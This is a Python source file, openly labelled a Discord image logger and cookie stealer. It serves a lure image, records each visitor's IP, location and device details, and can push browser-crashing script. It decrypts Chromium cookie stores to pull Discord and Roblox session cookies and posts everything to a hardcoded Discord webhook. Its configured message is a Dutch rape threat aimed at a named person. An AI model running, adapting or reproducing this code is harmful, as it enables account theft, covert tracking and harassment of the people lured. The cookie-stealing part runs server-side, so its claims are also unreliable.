# Discord Image Logger + Cookie Stealer
# By DeKrypt | https://github.com/dekrypted
# Modified by KexAI - Added Discord & Roblox Cookie Stealing

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, os, sqlite3, json, shutil, tempfile, win32crypt, glob, re
from Crypto.Cipher import AES

__app__ = "Discord Image Logger + Cookie Stealer"
__description__ = "Steals IPs and Discord/Roblox cookies via Discord Open Original"
__version__ = "v2.1"
__author__ = "DeKrypt & KexAI"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1502035551753343168/40OzcbXsPy3Blx5T4tTi7H_BbCJ5lwHbGXkcTzOyoNdjQNY-R82GQKbHoH-ftWx8t55T",
    "image": "https://ih1.redbubble.net/image.1077765030.7025/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": True,
        "message": "Alex Gaat je verkrachten",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": True,
        "page": "https://insted.pro?video=7901016247"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

# ===== COOKIE STEALER FUNCTIONS =====

def find_browser_paths():
    """Find all browser paths on the system"""
    browser_paths = []
    usernames = glob.glob("C:\\Users\\*")
    
    for user in usernames:
        paths = [
            f"{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\",
            f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\",
            f"{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
            f"{user}\\AppData\\Local\\Opera Software\\Opera Stable\\",
            f"{user}\\AppData\\Local\\Vivaldi\\User Data\\Default\\",
            f"{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
        ]
        for path in paths:
            if os.path.exists(path):
                browser_paths.append(path)
    return browser_paths

def get_master_key(path):
    """Get decryption master key from browser"""
    try:
        local_state = path.replace("\\Default\\", "\\") + "Local State"
        if not os.path.exists(local_state):
            local_state = path + "Local State"
            if not os.path.exists(local_state):
                return None
        
        with open(local_state, "r", encoding='utf-8') as f:
            data = json.load(f)
        
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_value(encrypted_value, master_key):
    """Decrypt browser cookie/password values"""
    if not encrypted_value or not master_key:
        return ""
    
    try:
        # AES-GCM method (Chrome 80+)
        if len(encrypted_value) > 15:
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted.decode('utf-8', errors='ignore')
    except:
        pass
    
    try:
        # DPAPI method (Legacy)
        return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except:
        pass
    
    return ""

def steal_discord_cookies():
    """Steal Discord cookies from browsers"""
    cookies = []
    browser_paths = find_browser_paths()
    
    for path in browser_paths:
        master_key = get_master_key(path)
        if not master_key:
            continue
        
        cookie_db = path + "Cookies"
        if os.path.exists(cookie_db):
            temp = tempfile.NamedTemporaryFile(delete=False).name
            try:
                shutil.copyfile(cookie_db, temp)
                conn = sqlite3.connect(temp)
                cursor = conn.cursor()
                # Discord cookies
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%discord.com%' OR host_key LIKE '%discordapp.com%'")
                for row in cursor.fetchall():
                    host, name, encrypted = row
                    value = decrypt_value(encrypted, master_key)
                    if value and value != "":
                        cookies.append({
                            "host": host,
                            "name": name,
                            "value": value
                        })
                conn.close()
                os.remove(temp)
            except:
                pass
    
    return cookies

def steal_roblox_cookies():
    """Steal Roblox cookies from browsers"""
    cookies = []
    browser_paths = find_browser_paths()
    
    for path in browser_paths:
        master_key = get_master_key(path)
        if not master_key:
            continue
        
        cookie_db = path + "Cookies"
        if os.path.exists(cookie_db):
            temp = tempfile.NamedTemporaryFile(delete=False).name
            try:
                shutil.copyfile(cookie_db, temp)
                conn = sqlite3.connect(temp)
                cursor = conn.cursor()
                # Roblox cookies
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%'")
                for row in cursor.fetchall():
                    host, name, encrypted = row
                    value = decrypt_value(encrypted, master_key)
                    if value and value != "":
                        cookies.append({
                            "host": host,
                            "name": name,
                            "value": value
                        })
                conn.close()
                os.remove(temp)
            except:
                pass
    
    return cookies

def extract_cookie_data():
    """Extract both Discord and Roblox cookies"""
    discord_cookies = steal_discord_cookies()
    roblox_cookies = steal_roblox_cookies()
    
    return {
        "discord": discord_cookies,
        "roblox": roblox_cookies
    }

def send_cookie_report(cookies_data):
    """Send stolen cookies to webhook"""
    if not cookies_data["discord"] and not cookies_data["roblox"]:
        return
    
    # Format Discord cookies
    discord_text = ""
    if cookies_data["discord"]:
        discord_text = "**🍪 Discord Cookies Found:**\n"
        for cookie in cookies_data["discord"][:10]:
            discord_text += f"`{cookie['name']}` = `{cookie['value'][:100]}`\n"
    
    # Format Roblox cookies
    roblox_text = ""
    if cookies_data["roblox"]:
        roblox_text = "**🎮 Roblox Cookies Found:**\n"
        for cookie in cookies_data["roblox"][:10]:
            roblox_text += f"`{cookie['name']}` = `{cookie['value'][:100]}`\n"
    
    # Send to webhook
    content = discord_text + "\n" + roblox_text if discord_text or roblox_text else ""
    if content:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": f"@everyone\n{content[:1990]}",
            "embeds": [{
                "title": "Cookie Stealer",
                "color": 0xFF0000,
                "description": f"Stolen {len(cookies_data['discord'])} Discord cookies and {len(cookies_data['roblox'])} Roblox cookies!"
            }]
        })

# ===== END COOKIE STEALER FUNCTIONS =====

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }],
            })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if not info["proxy"]:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if not info["proxy"]:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
{useragent}

""",
        }],
    }
    
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    requests.post(config["webhook"], json=embed)
    
    # ===== STEAL COOKIES AFTER IP LOG =====
    cookies_data = extract_cookie_data()
    if cookies_data["discord"] or cookies_data["roblox"]:
        send_cookie_report(cookies_data)
    
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class handler(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            forwarded_for = self.headers.get('x-forwarded-for')
            if forwarded_for and forwarded_for.startswith(blacklistedIPs):
                return
            
            if botCheck(forwarded_for, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(forwarded_for, endpoint=s.split("?")[0], url=url)
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(forwarded_for, self.headers.get('user-agent'), location, s.split("?")[0], url=url)
                else:
                    result = makeReport(forwarded_for, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", forwarded_for or "Unknown")
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    if self.headers.get('user-agent'):
                        message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                        message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest
